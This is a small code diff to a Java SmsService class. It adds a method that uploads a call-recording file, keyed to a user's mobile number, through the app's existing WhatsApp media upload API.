@@ -87,6 +87,13 @@ public class SmsService {
         SmsCallback smsCallback = new SmsCallback(4);
         smsAPI.postWhatsAppMedia("UPLOAD",userMobile,new TypedFile(getMimeType(file.getAbsolutePath()),file), smsCallback);
     }
+
+    public void sendCallrecordings(File file,String userMobile){
+        initSMSAPI();
+        SmsCallback smsCallback = new SmsCallback(5, file);
+        smsAPI.postWhatsAppMedia("UPLOAD",userMobile,new TypedFile(getMimeType(file.getAbsolutePath()),file), smsCallback);
+    }
+
     public static String removeSpChars(String s){
         s = s.replace("+","");
         s = s.replace("-","");
